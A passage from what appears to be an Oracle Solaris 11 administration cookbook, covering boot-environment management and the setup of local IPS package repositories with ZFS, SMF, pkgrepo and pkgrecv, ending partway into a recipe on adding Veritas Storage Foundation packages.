root@solaris11:~# <strong class="calibre8">beadm list</strong>
BE                   Active Mountpoint   Space     Policy    Created          

solaris              -         -              511.60M   static   2013-10-05 20:44 
solaris-backup-1    NR        /              4.74G    static   2013-10-10 19:57 
solaris-backup-b     -          -              173.0K    static   2013-10-12 22:47 </pre></div><p class="calibre7">If we need to destroy a boot environment (not the current one, for sure), we can do so by executing the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">beadm destroy solaris-backup-b</strong>
Are you sure you want to destroy solaris-backup-b?  This action cannot be undone(y/[n]): <strong class="calibre8">y</strong>

root@solaris11:~# <strong class="calibre8">beadm list</strong>
BE                   Active Mountpoint Space   Policy     Created          
         
solaris              -             -          247.55M   static     2013-10-05 20:44 
solaris-backup-1   NR            /           4.90G    static     013-10-10 19:57 </pre></div><p class="calibre7">What can we say about GRUB? There <a id="id64" class="calibre1"/>is no problem with it because<a id="id65" class="calibre1"/> Oracle Solaris 11 automatically<a id="id66" class="calibre1"/> removed the BE entry from the existing GRUB configuration.</p><div><div><div><div><h3 class="title2"><a id="ch01lvl3sec06" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">Creating a new BE is an excellent way to have an additional environment to initially test a new Oracle Solaris 11 patch or operating system upgrade from Oracle. If something goes wrong, we are able to switch back to the old environment without losing any data. Following the creation of the BE, we need to remember to activate the new BE before rebooting the system.</p></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch01lvl1sec15" class="calibre1"/>Listing and renaming a boot environment</h1></div></div></div><p class="calibre7">It is surprising that<a id="id67" class="calibre1"/> little details can<a id="id68" class="calibre1"/> help us with day-to-day administration. We've been using some repository commands since the beginning of the chapter; now, it's time to learn more about related commands.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch01lvl2sec16" class="calibre1"/>Getting ready</h2></div></div></div><p class="calibre7">To follow this recipe, it's necessary that we have a machine (physical or virtual) running Oracle Solaris 11; we log in<a id="id69" class="calibre1"/> to the system as the root user and open a terminal. Additionally, our system must have access to the Internet and some extra free space on disk.</p></div></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_2"><a id="ch01lvl2sec17" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">To list existing<a id="id70" class="calibre1"/> boot environments is straightforward; we do this by running the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">beadm list</strong>
BE                 Active Mountpoint Space    Policy     Created          
-----------------------          ------------------------------------   ----------              ------------------------     
solaris            NR       /          4.99G    static     2013-10-05 20:44
solaris-backup-1    -        -          163.0K   static     2013-10-10 19:57 </pre></div><p class="calibre7">According to the preceding output, the active BE is <code class="email">solaris</code> (flag <code class="email">N</code>), it'll be used in the next boot (flag <code class="email">R</code>), its size is 4.99 gigabytes, and its <code class="email">Mountpoint</code> is <code class="email">/</code>. There is other information too, but that isn't so relevant now. In this specific example, there's another BE named <code class="email">solaris-backup-1</code> (if the reader doesn't have a BE with the same name, it's fine to test using the existing solaris BE) that this time has taken up just 163 KB.</p><p class="calibre7">Oracle Solaris 11 makes it simple to rename inactive boot environments with the execution of the following commands:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">beadm rename solaris-backup-1 solaris-backup-a</strong>
root@solaris11:~# <strong class="calibre8">beadm list</strong>
BE                   Active Mountpoint Space    Policy     Created          
-----------------------          ------------------------------------   ----------              ------------------------     
solaris              NR       /          4.99G      static     2013-10-05 20:44
solaris-backup-a    -        -          163.0K     static     2013-10-10 19:57 </pre></div><div><div><div><div><h3 class="title2"><a id="ch01lvl3sec07" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">The listing and renaming of a BE is fundamental to handling and managing it. The <code class="email">beadm list</code> command shows us the directory that each BE is mounted on and the space that it takes. After Oracle Solaris 11 automatically creates a BE (the first one) during installation, we are able to find out when the operating system was installed. Renaming a BE<a id="id71" class="calibre1"/> is a complementary <a id="id72" class="calibre1"/>step that helps us comply with the name policy and makes administration easier.</p></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch01lvl1sec16" class="calibre1"/>Configuring an IPS local repository</h1></div></div></div><p class="calibre7">It is convenient to install packages from the official Oracle repository, but access to the Internet could become very intensive if in the company, there are a lot of installed machines with Oracle Solaris 11 that<a id="id73" class="calibre1"/> repeat the same routine to install packages. In this case, it is very handy to create a local IPS repository with the same packages from the official repository but have them available on a local network.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch01lvl2sec18" class="calibre1"/>Getting ready</h2></div></div></div><p class="calibre7">To follow this recipe, it's necessary that we have a machine (physical or virtual) running Oracle Solaris 11; we log in to the system as the root user and open a terminal. Additionally, our system must be able to access the Internet. There are further requirements, such as extra disk (physical or virtual), to create a <strong class="calibre8">Z File System</strong> (<strong class="calibre8">ZFS</strong>), and we have to download the repository image.</p><p class="calibre7">To download the<a id="id74" class="calibre1"/> repository image, go to <a class="calibre1" href="http://www.oracle.com/technetwork/server-storage/solaris11/downloads/index.html">http://www.oracle.com/technetwork/server-storage/solaris11/downloads/index.html</a>, click on <strong class="calibre8">Create a Local Repository</strong>, and download all the available parts (at the time of this writing, there are four parts). Extract and concatenate them by executing the following:</p><div><pre class="programlisting">root@solaris11:~#  <strong class="calibre8">cat </strong><em class="calibre11">part1  part2  part3  part4</em><strong class="calibre8"> ...  &gt; solaris-11-repo-full.iso</strong>
</pre></div></div></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_2"><a id="ch01lvl2sec19" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">We can create the repository in a separated disk to get some performance and maintenance advantage. Indeed, we aren't obliged to do this, but it is greatly recommended. To list the disks that are available (the <code class="email">format</code> command), we create a new pool and then a new ZFS filesystem in this pool, and execute the following command:</p><div><pre class="programlisting">  root@solaris11:~# <strong class="calibre8">format</strong>
Searching for disks...done

AVAILABLE DISK SELECTIONS:
       0. c8t0d0 &lt;VBOX-HARDDISK-1.0-80.00GB&gt;
          /pci@0,0/pci1000,8000@14/sd@0,0
       1. c8t1d0 &lt;VBOX-HARDDISK-1.0 cyl 2086 alt 2 hd 255 sec 63&gt;
          /pci@0,0/pci1000,8000@14/sd@1,0
Specify disk (enter its number): 1
selecting c8t1d0
[disk formatted]
No Solaris fdisk partition found.</pre></div><p class="calibre7">We realize that if the second disk (<code class="email">c8t1d0</code>) doesn't have any partitions, then the following sequence of commands creates a pool (the <code class="email">zpool create</code> command). We list it (the <code class="email">zpool list</code> command) and create<a id="id75" class="calibre1"/> a new ZFS filesystem (the <code class="email">zfs create</code> command), as follows:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">zpool create repo_pool c8t1d0</strong>
root@solaris11:~# <strong class="calibre8">zpool status repo_pool</strong>
  pool: repo_pool
  state: ONLINE
  scan: none requested
  config:

    NAME      STATE     READ WRITE CKSUM
repo_pool  ONLINE       0     0     0
    c8t1d0  ONLINE       0     0     0

    errors: No known data errors

root@solaris11:~# <strong class="calibre8">zfs create repo_pool/repoimage</strong>
root@solaris11:~# <strong class="calibre8">zfs list repo_pool/repoimage</strong>
    NAME                 USED  AVAIL  REFER  MOUNTPOINT
    repo_pool/repoimage  31K   15.6G  31K    /repo_pool/repoimage</pre></div><p class="calibre7">It's time to use the repository image (<code class="email">solaris-11-repo-full.iso</code> from the <em class="calibre11">Getting ready</em> section) to create our local repository, and to do this, we need to mount this image and copy all of its contents (about 6.8 GB) to the repository filesystem that we created. Therefore, in the first step, we create a mount point:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">mkdir /software</strong>
</pre></div><p class="calibre7">Now, we create a device file that points to the repository image using the <code class="email">lofiadm</code> command and mount it:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">lofiadm -a sol-11-repo-full.iso</strong>
/dev/lofi/1
root@solaris11:~# <strong class="calibre8">mount -F hsfs /dev/lofi/1 /software</strong>
</pre></div><p class="calibre7">To copy the image content to the local repository, we run the following:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">rsync -aP  /software/repo  /repo_pool/repoimage</strong>
root@solaris11:/repo_pool/repoimage# <strong class="calibre8">ls -al</strong>
total 37
drwxr-xr-x   3 root     root           6 Oct 15 19:31 .
drwxr-xr-x   3 root     root           3 Oct 14 19:25 ..
-rw-r--r--   1 root     root        3247 Sep 20  2012 COPYRIGHT
-rwxr-xr-x   1 root     root        1343 Sep 20  2012 NOTICES
-rw-r--r--   1 root     root        7531 Sep 28  2012 README
drwxr-xr-x   3 root     root           4 Sep 19  2012 repo</pre></div><p class="calibre7">Configure the repository server service<a id="id76" class="calibre1"/> in <strong class="calibre8">Service Management Facility</strong> (<strong class="calibre8">SMF</strong>). If you still aren't comfortable with SMF, I suggest reading <a class="calibre1" title="Chapter 5. Playing with Oracle Solaris 11 Services" href="part0069_split_000.html#page">Chapter 5</a>, <em class="calibre11">Playing with Oracle Solaris 11 Services</em>, later. So, the use of the <code class="email">svcprop</code> command makes it possible to verify some service properties. Likewise, the <code class="email">svccfg</code> command is appropriate if you wish to change a specific property from a service.</p><p class="calibre7">To verify what the current repository<a id="id77" class="calibre1"/> directory is, we execute the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">svcprop -p pkg/inst_root application/pkg/server</strong>
/var/pkgrepo</pre></div><p class="calibre7">We change the repository directory and make it read-only by running the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">svccfg -s application/pkg/server setprop </strong>
<strong class="calibre8">pkg/inst_root=/repo_pool/repoimage/repo</strong>
root@solaris11:~# <strong class="calibre8">svccfg -s application/pkg/server setprop pkg/readonly=true</strong>
</pre></div><p class="calibre7">We quickly check our changes by running the following:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">svcprop -p pkg/inst_root application/pkg/server</strong>
/repo_pool/repoimage/repo</pre></div><p class="calibre7">To avoid a TCP port collision with any existing service that is configured on port <code class="email">80</code>, we change it to <code class="email">9999</code>:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">svccfg -s application/pkg/server setprop pkg/port=9999</strong>
</pre></div><p class="calibre7">Now, we reload the repository configuration, start it, and then index the repository catalog for a better package search operation:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">svcadm refresh application/pkg/server</strong>
root@solaris11:~# <strong class="calibre8">svcadm enable application/pkg/server</strong>
root@solaris11:~# <strong class="calibre8">svcs | grep -i pkg/server</strong>
online         20:06:43 svc:/application/pkg/server:default
root@solaris11:~# <strong class="calibre8">pkgrepo refresh -s /repo_pool/repoimage/repo</strong>
Initiating repository refresh.</pre></div><p class="calibre7">We list the current configured publisher and configure Oracle Solaris 11 for a new one:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg publisher</strong>
PUBLISHER                   TYPE     STATUS P LOCATION
solaris                     origin   online F http://pkg.oracle.com/solaris/release/
root@solaris11:~# <strong class="calibre8">pkg set-publisher -G '*' -g http://solaris11.example.com solaris</strong>
</pre></div><p class="calibre7">We need to take care. In the preceding<a id="id78" class="calibre1"/> command, the <code class="email">-G</code> option removed any existing origins (repositories) of the <code class="email">solaris</code> publisher, and the <code class="email">-g</code> option set a new URI that points to the local repository of the same publisher (<code class="email">solaris</code>). Furthermore, the URL, <code class="email">solaris.example.com</code>, points to the local system address of the repository machine (it could be <code class="email">127.0.0.1</code>).</p><p class="calibre7">We now have the opportunity to test our new repository:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg search nmap</strong>
INDEX           ACTION VALUE                                                                                                                   PACKAGE
pkg.description set    Nmap is useful for inventorying the network, managing service upgrade schedules, and monitoring host or service uptime. pkg:/diagnostic/nmap@5.51-0.175.1.0.0.24.0
basename        dir    usr/share/nmap                                                                                                          pkg:/diagnostic/nmap@5.51-0.175.1.0.0.24.0
basename        file   usr/bin/nmap                                                                                                            pkg:/diagnostic/nmap@5.51-0.175.1.0.0.24.0
pkg.fmri        set    solaris/diagnostic/nmap                                                                                                 pkg:/diagnostic/nmap@5.51-0.175.1.0.0.24.0

root@solaris11:~# <strong class="calibre8">pkg publisher</strong>
PUBLISHER                   TYPE     STATUS P LOCATION
solaris                     origin   online F http://solaris11.example.com/
root@solaris11:~# <strong class="calibre8">pkgrepo info -s /repo_pool/repoimage/repo</strong>
PUBLISHER PACKAGES STATUS           UPDATED
solaris   4401     online           2012-09-27T22:22:59.530981Z</pre></div><p class="calibre7">Wow! We've listed the configured publishers and changed the <code class="email">solaris</code> publisher URI. Additionally, we are able to collect more information about the local repository by running the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkgrepo get -s /repo_pool/repoimage/repo</strong>
SECTION    PROPERTY    VALUE
publisher  prefix      solaris
repository description This\ repository\ serves\ a\ copy\ of\ the\ Oracle\ Solaris\ 11.1\ Build\ 24b\ Package\ Repository.
repository name        Oracle\ Solaris\ 11.1\ Build\ 24b\ Package\ Repository
repository version     4</pre></div><p class="calibre7">We can change any attribute of the<a id="id79" class="calibre1"/> repository, and afterwards, verify our changes by executing the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkgrepo set -s /repo_pool/repoimage/repo</strong>
repository/description="My local Oracle Solaris 11 repository" repository/name="LOCAL SOLARIS 11 REPO" 

root@solaris11:~# <strong class="calibre8">pkgrepo get -s /repo_pool/repoimage/repo</strong>
SECTION    PROPERTY    VALUE
publisher  prefix      solaris
repository description My\ local\ Oracle\ Solaris\ 11\ repository
repository name        LOCAL\ SOLARIS\ 11\ REPO
repository version     4</pre></div><p class="calibre7">Sometimes, we'll need to update our local repository from a reliable and updated source (Oracle). We execute the following command to accomplish this task:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkgrecv -s http://pkg.oracle.com/solaris/release/ -d /repo_pool/repoimage/repo '*'</strong>
Processing packages for publisher solaris ...
Retrieving and evaluating 4401 package(s)...
PROCESS                                 ITEMS     GET (MB)    SEND (MB)
Completed                                 7/7  241.2/241.2  617.1/617.1</pre></div><p class="calibre7">By contrast, the most impressive fact is that we could have used this same command to copy the entire repository from the official Oracle repository at the beginning of this recipe instead of downloading the entire repository, concatenating the parts, creating a device using the <code class="email">lofiadm</code> command, executing the <code class="email">rsync</code> command, and so on. I had a personal experience when using<a id="id80" class="calibre1"/> this particular command in which, for some reason, there was a download error while I was getting packages. To continue with a download that was initially interrupted, we run the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkgrecv -c -s http://pkg.oracle.com/solaris/release/ -d /repo_pool/repoimage/repo '*'</strong>
</pre></div><p class="calibre7">It's almost the same command, but we use the <code class="email">-c</code> option here instead.</p><p class="calibre7">In some situations, we want to access our local repository to get some packages, but by using another interface. To interact with our own repository, we need to open a web browser and navigate to our local repository (in my test environment, the IP address is <code class="email">192.168.1.133</code>—<code class="email">solaris11.example.com</code>—and the port is <code class="email">9999</code>):</p><div><img src="img/00004.jpeg" alt="How to do it…" class="calibre12"/></div><p class="calibre13"> </p><p class="calibre7">In the preceding screenshot, we searched for the <code class="email">nmap</code> package, and the interface showed us that the specified package is already installed. If this is the case, we take a separate filesystem to improve the read/write performance.</p><div><div><div><div><h3 class="title2"><a id="ch01lvl3sec08" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">Configuring a local repository is a suitable method to gain more control on package administration and speeding up IPS operations.</p></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch01lvl1sec17" class="calibre1"/>Configuring a secondary IPS local repository</h1></div></div></div><p class="calibre7">So far, we've configured only one local repository, but we could have two or more local repositories for<a id="id81" class="calibre1"/> distinguished goals, and this would be very useful for a company with independent production and training environments. Let's have a look at the example in the following section.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch01lvl2sec20" class="calibre1"/>Getting ready</h2></div></div></div><p class="calibre7">To follow this recipe, it's necessary that we have a machine (physical or virtual) running Oracle Solaris 11; we log in to the system as the root user and open a terminal. Additionally, our Solaris 11 system needs to have access to the Internet. Some extra free space on the disk will be required, as well as an Internet browser.</p></div></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_2"><a id="ch01lvl2sec21" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">To start with, we create a ZFS filesystem:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">zfs create repo_pool/training_repo</strong>
root@solaris11:~# <strong class="calibre8">zfs list</strong>
NAME                              USED  AVAIL  REFER  MOUNTPOINT
repo_pool                        7.24G  8.39G    35K  /repo_pool
repo_pool/repoimage              7.24G  8.39G  7.24G  /repo_pool/repoimage
repo_pool/training_repo            31K  8.39G    31K  /repo_pool/training_repo
rpool                            30.5G  47.8G  4.91M  /rpool
rpool/ROOT                       27.4G  47.8G    31K  legacy
rpool/ROOT/solaris               16.1G  47.8G  19.7G  /
rpool/ROOT/solaris-backup-a      11.2G  47.8G  10.6G  /
rpool/ROOT/solaris-backup-a/var   385M  47.8G   202M  /var
rpool/ROOT/solaris/var           79.9M  47.8G   213M  /var
rpool/VARSHARE                   54.5K  47.8G  54.5K  /var/share
rpool/dump                       2.06G  47.8G  2.00G  -
rpool/export                      805K  47.8G    32K  /export
rpool/export/home                 773K  47.8G    32K  /export/home
rpool/export/home/ale             741K  47.8G   741K  /export/home/ale
rpool/swap                       1.03G  47.8G  1.00G  -</pre></div><p class="calibre7">Once the ZFS filesystem is created, the following step is required to create a repository (an empty one—only the skeleton). We set a publisher <a id="id82" class="calibre1"/>and verify that everything went well using the following commands:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkgrepo create /repo_pool/training_repo</strong>
root@solaris11:~# <strong class="calibre8">pkgrepo info -s /repo_pool/training_repo</strong>
PUBLISHER  PACKAGES  STATUS           UPDATED

root@solaris11:~# <strong class="calibre8">pkgrepo set -s /repo_pool/training_repo publisher/prefix=alexandreborges.org</strong>
root@solaris11:~# <strong class="calibre8">pkgrepo info -s /repo_pool/training_repo</strong>
PUBLISHER            PACKAGES  STATUS     UPDATED
alexandreborges.org     0      online     2013-10-16T20:18:22.803927Z</pre></div><p class="calibre7">Next, we add a new instance of the SMF <code class="email">pkg/server</code> named <code class="email">training</code> and two property groups (using the <code class="email">addpg</code> parameter) with some predefined properties (more about services can be learned from <a class="calibre1" href="http://docs.oracle.com/cd/E26502_01/html/E29003/docinfo.html#scrolltoc">http://docs.oracle.com/cd/E26502_01/html/E29003/docinfo.html#scrolltoc</a> and their respective command manual pages). In the end, we enable the training instance:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">svccfg -s pkg/server add training</strong>
root@solaris11:~# <strong class="calibre8">svccfg -s pkg/server:training addpg pkg application</strong>
root@solaris11:~# <strong class="calibre8">svccfg -s pkg/server:training addpg general framework</strong>
root@solaris11:~# <strong class="calibre8">svccfg -s pkg/server:training setprop general/complete=astring:\”\”</strong>
root@solaris11:~# <strong class="calibre8">svccfg -s pkg/server:training setprop general/enabled=boolean: true</strong>
</pre></div><p class="calibre7">If you recall, we used the port <code class="email">9999</code> in the first repository we configured. For this second repository, we configure the port <code class="email">8888</code>, after which the repository path will be set:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">svccfg -s pkg/server:training setprop pkg/port=8888</strong>
root@solaris11:~# <strong class="calibre8">svccfg -s pkg/server:training setprop pkg/inst_root=/repo_pool/training_repo</strong>
</pre></div><p class="calibre7">As we did in the first repository, we need to update the index of the second repository and start the new repository instance:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">svcadm refresh application/pkg/server:training</strong>
root@solaris11:~# <strong class="calibre8">svcadm restart application/pkg/server:training</strong>
root@solaris11:~# <strong class="calibre8">svcs -a | grep training</strong>
online         18:09:51 svc:/application/pkg/server:training</pre></div><p class="calibre7">We can access<a id="id83" class="calibre1"/> the repository using a browser at <code class="email">http://solaris11.example.com:8888</code>:</p><div><img src="img/00005.jpeg" alt="How to do it…" class="calibre12"/></div><p class="calibre13"> </p><div><div><div><div><h3 class="title2"><a id="ch01lvl3sec09" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">In this recipe, we learned how to create a second repository, which can be dedicated to accomplishing a different goal<a id="id84" class="calibre1"/> from the first repository rather than the one from the previous recipe. The main command from this recipe is <code class="email">pkgrepo</code>, which creates a new local repository to store packages. After that, we configure the SMF framework to offer this new repository automatically and on a planned TCP port.</p></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch01lvl1sec18" class="calibre1"/>Publishing packages into a repository</h1></div></div></div><p class="calibre7">Certainly, inserting packages into a local repository won't be a very frequent task, but surprisingly, this action saves time. Besides, this topic isn't hard; the process is very interesting because we will learn to handle complex programs such as Veritas Storage Foundations HA.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch01lvl2sec22" class="calibre1"/>Getting ready</h2></div></div></div><p class="calibre7">To follow this recipe, it's necessary<a id="id85" class="calibre1"/> that we have a machine (physical or virtual) running Oracle Solaris 11; we log in to the system as the root user and open<a id="id86" class="calibre1"/> a terminal. Additionally, it's preferable that our Solaris 11 system has access to the Internet.</p></div></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_2"><a id="ch01lvl2sec23" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">We can set the prefix that was previously marked <code class="email">alexandreborges.org</code> to <code class="email">training</code> to make our administration easier and more consistent with the name of the instance service that we chose when an SMF service entry was made for this repository:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkgrepo set -s /repo_pool/training_repo publisher/prefix=training</strong>
</pre></div><p class="calibre7">An interesting fact is that the repository is usually created as read-only, and to change it to read/write is straightforward:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">svccfg -s application/pkg/server:training setprop pkg/readonly=false</strong>
</pre></div><p class="calibre7">The result of the previous command can be seen by running the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">svcprop -p pkg/readonly application/pkg/server:training</strong>
false</pre></div><p class="calibre7">We now reload the configurations and start the repository services again:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">svcadm refresh pkg/server:training</strong>
root@solaris11:~# <strong class="calibre8">svcadm restart pkg/server:training</strong>
root@solaris11:~# <strong class="calibre8">svcs pkg/server:training</strong>
STATE          STIME    FMRI
online         18:37:43 svc:/application/pkg/server:training</pre></div><p class="calibre7">The new repository (training) doesn't appear in the publisher list yet:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg publisher</strong>
PUBLISHER      TYPE    STATUS  P  LOCATION
solaris        origin  online  F  http://pkg.oracle.com/solaris/release/
solarisstudio  origin  online  F  https://pkg.oracle.com/solarisstudio/release/</pre></div><p class="calibre7">What's this <code class="email">solarisstudio</code> publisher? Where did this publisher line come from? Relax! I've installed the Oracle Solaris<a id="id87" class="calibre1"/> Studio 12.3 to execute some tests (not shown here), but you can disregard it. There's nothing related to the current explanation, but<a id="id88" class="calibre1"/> if you're a developer, you can try it from <a class="calibre1" href="http://www.oracle.com/technetwork/server-storage/solarisstudio/downloads/index.html">http://www.oracle.com/technetwork/server-storage/solarisstudio/downloads/index.html</a>.</p><p class="calibre7">Returning to the main subject, we<a id="id89" class="calibre1"/> need to add the publisher (<code class="email">training</code>) that points to the secondary repository (<code class="email">http://localhost:8888</code>) by running the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg set-publisher -O http://localhost:8888 training</strong>
root@solaris11:~# <strong class="calibre8">pkg publisher</strong>
PUBLISHER                   TYPE     STATUS P LOCATION
solaris                     origin   online F http://pkg.oracle.com/solaris/release/
solarisstudio               origin   online F https://pkg.oracle.com/solarisstudio/release/
training                    origin   online F http://localhost:8888/</pre></div><p class="calibre7">Finally, let's pick two packages (<code class="email">wireshark</code> and <code class="email">wireshark-common</code>) from the <code class="email">solaris</code> repository and include them in the secondary repository:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkgrecv -s http://pkg.oracle.com/solaris/release -d /repo_pool/training_repo/publisher/training wireshark</strong>
Processing packages for publisher solaris ...
Retrieving and evaluating 1 package(s)...
PROCESS                                     ITEMS    GET (MB)   SEND (MB)
Completed                                    1/1     2.1/2.1     6.0/6.0

root@solaris11:~# <strong class="calibre8">pkgrecv -s http://pkg.oracle.com/solaris/release -d /repo_pool/training_repo/publisher/training wireshark-common</strong>
Processing packages for publisher solaris ...
Retrieving and evaluating 1 package(s)...
PROCESS                                 ITEMS  GET (MB)   SEND (MB)
Completed                               1/1    33.5/33.5  125.5/125.5</pre></div><p class="calibre7">We can confirm our finished task by executing the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkgrepo info -s /repo_pool/training_repo</strong>
PUBLISHER  PACKAGES  STATUS           UPDATED
training   2         online           2013-10-20T22:28:27.023984Z</pre></div><p class="calibre7">Using another approach, we are<a id="id90" class="calibre1"/> able to obtain the same results in a<a id="id91" class="calibre1"/> detailed report from the Apache web server by executing the following commands:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">svcadm refresh pkg/server:training</strong>
root@solaris11:~# <strong class="calibre8">svcadm restart pkg/server:training</strong>
</pre></div><p class="calibre7">We can now open a web browser and go to the URL, <code class="email">http://localhost:8888</code>:</p><div><img src="img/00006.jpeg" alt="How to do it…" class="calibre12"/></div><p class="calibre13"> </p><p class="calibre7">Fantastic! Wireshark packages are now available from the Apache web server and can be downloaded and installed anytime.</p><div><div><div><div><h3 class="title2"><a id="ch01lvl3sec10" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">Insertion of a package into a local repository is a result of the previous recipe. This kind of operation is performed <a id="id92" class="calibre1"/>when a technical team needs to share a <a id="id93" class="calibre1"/>new package among its members. The key command is <code class="email">pkgrecv</code>, which does most of the task for us.</p></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch01lvl1sec19" class="calibre1"/>Adding big applications into a repository</h1></div></div></div><p class="calibre7">Some professionals might wonder whether it is possible to insert complex applications into repositories. Sure! For example, let's take the <a id="id94" class="calibre1"/>
<strong class="calibre8">Storage Foundation and </strong>
<a id="id95" class="calibre1"/>
<strong class="calibre8">Veritas Cluster Server High Availability Solutions</strong> (both are available in version 6.01 at the time of this writing).</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch01lvl2sec24" class="calibre1"/>Getting ready</h2></div></div></div><p class="calibre7">To follow this recipe, it's <a id="id96" class="calibre1"/>necessary that we<a id="id97" class="calibre1"/> have a machine (physical or virtual) running Oracle Solaris 11; we log in to the system as the root user and open a terminal. Additionally, the system must have access to the Internet, some extra space on the disk, and packages of Storage Foundation and Veritas Cluster Server High Availability Solutions, which can be downloaded from <a class="calibre1" href="http://www.symantec.com/products-solutions/trialware/?pcid=recently_released#">http://www.symantec.com/products-solutions/trialware/?pcid=recently_released#</a>. The tarball is named <code class="email">VRTS_SF_HA_Solutions_6.0.1_Solaris_x64.tar.gz</code>, and it is composed by Veritas Storage Foundation 6.0.1 and Veritas Cluster Server 6.0.1. You can install them in keyless mode for 60 days to try it out.</p></div></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_2"><a id="ch01lvl2sec25" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">After downloading the tarball into the home directory (<code class="email">/root</code>), we extract it:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">mkdir SFHA601</strong>
root@solaris11:~# <strong class="calibre8">mv VRTS_SF_HA_Solutions_6.0.1_Solaris_x64.tar.gz SFHA601</strong>
root@solaris11:~# <strong class="calibre8">cd SFHA601/</strong>
root@solaris11:~/SFHA601# <strong class="calibre8">ls</strong>
VRTS_SF_HA_Solutions_6.0.1_Solaris_x64.tar.gz
root@solaris11:~/SFHA601# <strong class="calibre8">tar zxvf VRTS_SF_HA_Solutions_6.0.1_Solaris_x64.tar.gz</strong>
root@solaris11:~/SFHA601# <strong class="calibre8">cd dvd2-sol_x64/sol11_x64/pkgs</strong>
root@solaris11:~/SFHA601/dvd2-sol_x64/sol11_x64/pkgs# <strong class="calibre8">ls</strong>
info          VRTSpkgs.p5p</pre></div><p class="calibre7">In the next step, we find out <a id="id98" class="calibre1"/>which packages are<a id="id99" class="calibre1"/> included in the Storage Foundation HA application. Then, to list its contents, we execute the following:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg list -g /root/SFHA601/dvd2-sol_x64/sol11_x64/pkgs/VRTSpkgs.p5p </strong>
NAME (PUBLISHER)                       VERSION                    IFO
VRTSamf (Symantec)                     6.0.100.0                  ---
VRTSaslapm (Symantec)                  6.0.100.0                  ---
VRTScavf (Symantec)                    6.0.100.0                  ---
VRTScps (Symantec)                     6.0.100.0                  ---
VRTSdbac (Symantec)                    6.0.100.0                  ---
VRTSdbed (Symantec)                    6.0.100.0                  ---
VRTSfssdk (Symantec)                   6.0.100.0                  ---
VRTSgab (Symantec)                     6.0.100.0                  ---
VRTSglm (Symantec)                     6.0.100.0                  ---
VRTSgms (Symantec)                     6.0.100.0                  ---
VRTSllt (Symantec)                     6.0.100.0                  ---
VRTSodm (Symantec)                     6.0.100.0                  ---
VRTSperl (Symantec)                    5.14.2.5                   ---
VRTSsfcpi601 (Symantec)                6.0.100.0                  ---
VRTSsfmh (Symantec)                    5.0.196.0                  ---
VRTSspt (Symantec)                     6.0.100.0                  ---
VRTSsvs (Symantec)                     6.0.100.0                  ---
VRTSvbs (Symantec)                     6.0.100.0                  ---
VRTSvcs (Symantec)                     6.0.100.0                  ---
VRTSvcsag (Symantec)                   6.0.100.0                  ---
VRTSvcsea (Symantec)                   6.0.100.0                  ---
